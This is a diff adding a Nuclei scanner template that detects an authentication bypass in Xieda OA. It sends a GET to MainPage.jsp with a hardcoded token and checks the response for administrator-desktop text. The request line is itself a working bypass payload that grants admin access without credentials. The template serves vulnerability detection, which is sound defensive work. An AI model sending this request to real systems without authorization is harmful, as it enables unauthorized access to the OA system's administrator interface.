@@ -1,0 +1,29 @@
+id: xieda-mainpage-jsp-bypass-auth
+
+info:
+  name: 协达OA MainPage.jsp 绕过验证登陆漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access, bypass-authentication
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "管理员"
+          - "桌面"
+          - "var token=\"YXR-YMD-SYQ-TOKEN\""
+        part: body
+      - type: word
+        words:
+          - "重新登录"
+        part: body
+        negative: true
